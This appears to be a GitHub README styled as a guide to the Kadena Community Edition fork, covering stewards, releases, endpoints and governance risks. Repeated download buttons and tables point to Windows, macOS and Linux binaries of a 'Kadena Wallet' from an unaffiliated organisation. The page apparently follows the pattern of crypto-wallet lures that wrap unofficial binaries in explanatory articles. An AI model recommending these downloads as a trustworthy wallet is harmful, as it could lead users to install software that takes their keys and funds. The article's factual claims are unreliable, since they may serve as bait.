![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Community Edition of Kadena, Explained</h1>

<p align="center">A Kadena Wallet guide to the network and the market.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

When Kadena LLC stopped operating in October 2025, the network did not become ownerless in the way people imagine. A group of former core developers took control of a specific set of on-chain keys, published a fork of the node software, and has been shipping maintenance releases ever since. That arrangement is called the KDA Community Edition, and understanding it is the difference between "nobody runs this chain" and "five named people hold the keys".

## You'll see this if

- You have read that Kadena is "community-run" and want to know what that means concretely.
- You are choosing a node version, an API endpoint, or an explorer and need to know which ones are current.
- You are evaluating whether to build on, mine, or hold on this chain.
- You have seen two different community websites and cannot tell which is official.

## What actually changed at the fork

The November 2025 hard fork did a narrow, specific thing. It moved control of the platform share and six namespace keysets from keys held by the company to a 3-of-5 multisig held by five individuals, and it added community bootstrap nodes.

What did **not** change:

- account balances, account names, and account guards;
- the twenty-chain architecture, chain IDs 0 through 19;
- the Pact language and the coin contract;
- the block time, still about 30 seconds per chain on average;
- the token. No migration, no snapshot, no claim window.

That is why a wallet opened in 2026 still shows the same addresses as in 2024. The fork changed governance, not state.

## Who holds the keys

The five stewards introduced themselves publicly on 15 November 2025:

| Person | Background given |
| --- | --- |
| Edmund Noble | former Chainweb technical lead |
| Jose Cardona | former Pact technical lead |
| Louis Page | former devops lead |
| Pascal Sclafer | community contributor |
| Tadeas Kmenta | InFlux Technologies |

They hold a 3-of-5 multisig, which means no single person can move the controlled keysets alone and any three can. That is a meaningful improvement over a single company key, and it is also a small, fixed group with no published election process. Both halves of that sentence are true at once.

The project publishes at **kda-chain.org** and on Medium under the Community Kadena account. Its GitHub organisation describes itself as "Unofficial... not affiliated with, sponsored by, or endorsed by Kadena LLC" - accurate, since there is no longer a Kadena LLC to be affiliated with.

## The two community sites that get confused

| Site | What it is |
| --- | --- |
| kda-chain.org | The Community Edition's own site: node docs, wallet list, DAO page, history, CLI reference. |
| kadena.ws | "Kadena Nexus", an independent community data and monitoring project run from Saudi Arabia. It links to kda-chain.org as the CE site and is not the same team. |

Neither is an official successor to kadena.io. If a page presents itself as the official Kadena site in 2026, treat that as a red flag rather than a convenience.

## What the community has shipped

Five releases have shipped on the community fork since the takeover. Version 3.0 was the takeover build in early November 2025, followed days later by 3.0.1. Version 3.1 arrived just before Christmas with miner voting, altered SPV expiry handling and no rewind. Version 3.2 landed in August 2026 carrying Pact 5.4.1, a fresh testnet and a six-month SPV window. Version 3.2.1 followed a few weeks later with compile fixes described as optional.

The API reports `nodePackageVersion` 3.2 in November 2026, which tells you the release line is the one actually deployed.

## What has not shipped

This is the part marketing pages omit, so it belongs in any honest explanation:

- **The foundation and DAO.** Announced for Q4 2025. The community's own DAO page still reads "under construction", while a different page on the same site describes a working DAO. One of those pages is wrong.
- **The 30-second block-time target.** Live average is about 30.94 seconds, essentially unchanged.
- **"Loom", the promised Chainweaver successor.** No release found.
- **A published activation date for the 3.2 hard fork.** The notes describe it as miner-triggered at an unknown date, and no post-activation report could be found.

Maintenance is real. Delivery of the roadmap is not, and the gap between the two is the single best predictor of how much this chain can do without funding.

## Where the live infrastructure is

| Purpose | Working endpoint in November 2026 |
| --- | --- |
| Node API | `api.chainweb-community.org` |
| Pact calls per chain | the same host, with a chain number from 0 to 19 in the path |
| Explorer | `explorer.chainweb-community.org/mainnet` |
| Indexer | a third-party GraphQL endpoint operated by the community |

The old `api.chainweb.com` and `explorer.kadena.io` do not answer. That is the most common reason an old script or guide fails, and it has nothing to do with the chain itself.

## How to participate

**Run a node.** Builds are published as release assets and as container images (`kadena/chainweb-node:3.2.1` and the community registry equivalent). Running a node is the most direct way to stop depending on someone else's API.

**Mine.** The chain is proof-of-work and hashrate is currently around 16.8 PH/s by third-party measurement. Mining economics at present prices are a separate question, and one worth doing arithmetic on rather than asking in a chat.

**Vote as a miner.** Version 3.1 introduced miner voting, which is how the fork mechanism now works. That makes miner participation a governance function, not just a revenue activity.

**Participate in discussion.** The community channels linked from kda-chain.org are where release announcements and incidents appear first.

## How to sanity-check any claim about the CE

Three checks settle most arguments:

1. Does the endpoint at `api.chainweb-community.org/info` answer, and what version does it report?
2. Does the newest release on the community node repository postdate the claim?
3. Does the claim appear on kda-chain.org itself, or only in a third-party summary?

If a page links to the old API host, was written before November 2025, or cannot name a release, it is describing a network that no longer exists.

## The risk you should not paper over

A 3-of-5 multisig held by five volunteers is better than a single company key and worse than a funded foundation with published governance. If two of those five become unreachable, the keysets cannot be moved. If nobody funds development, maintenance stops. Those are structural risks, not FUD, and they belong in any honest description of a chain that lost its company.

What can be said in the chain's favour is that it has now survived fourteen months without one, with blocks still being produced and code still being released. Whether that continues is the open question, and it is answerable only by watching releases and governance rather than by reading opinion.

## FAQ

**Is the Community Edition official?**
It is the de facto continuation and it explicitly says it is not affiliated with Kadena LLC. "Official" no longer has a clear meaning here, which is why the stewardship arrangement matters more than the label.

**Do I need to do anything to use it?**
No. Same accounts, same keys, same token. You only need new endpoints for tools that used the old company API.

**Can the stewards move my KDA?**
No. The multisig controls platform share and namespace keysets, not user accounts. Your funds move only with your keys.

**Is there a foundation?**
None that could be verified as operating. The DAO page says it is under construction.

**Which node version should I run?**
The newest release in the community repository, currently 3.2.x. Version 3.2.1 is described as optional compile fixes.

## Related reading

- Is Kadena dead? What ended and what still runs
- What happened to Kadena: the timeline
- Cross-chain transfers in Kadena Wallet
- KDA delisting and withdrawal deadlines

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [KDA Delisting Deadlines: What Kadena Wallet Holders Should Check](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/kda-delisting-withdrawal-deadlines-kadena-wallet.md)
- [Why KDA Was Delisted: The Exchange Decisions, in Order](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/why-was-kadena-delisted.md)
- [Buying KDA in 2026: What Still Works and What Closed](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/buying-kda-in-2026-kadena-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
